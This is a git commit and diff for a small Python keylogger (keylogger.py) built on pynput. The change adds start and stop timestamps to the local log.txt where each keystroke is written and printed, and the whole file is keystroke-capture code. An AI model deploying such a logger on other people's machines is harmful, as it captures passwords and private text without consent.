961894619ad69152ebd50bfc29acf009e21ff893
amithck <amith.kowshik@gmail.com>
2023-01-12 22:29:19 +0530

    added time

--- keylogger.py
+++ keylogger.py
@@ -1,16 +1,20 @@
 import pynput
 
 from pynput.keyboard import Key, Listener
+import time
 
 
 count = 0
 keys = []
+start= time.ctime()
+with open('log.txt','a') as x:
+    x.write('\nStart time:'+str(start)+'\n\n')
 
 def on_press(key):
     global keys, count
     keys.append(key)
     count += 1
-    print("{0} pressed".format(key))
+    print("{0} pressed at ".format(key)+str(time.ctime()))
     if count >= 1:
         count = 0
         write_file(keys)
@@ -26,10 +30,12 @@ def write_file(keys):
                 f.write("\n")
             else:
                 f.write(k)
-            
 
 def on_release(key):
     if key == Key.esc:
+        stop=time.ctime()
+        with open('log.txt','a') as x:
+            x.write('\n\nStop Time:'+str(stop)+'\n')
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
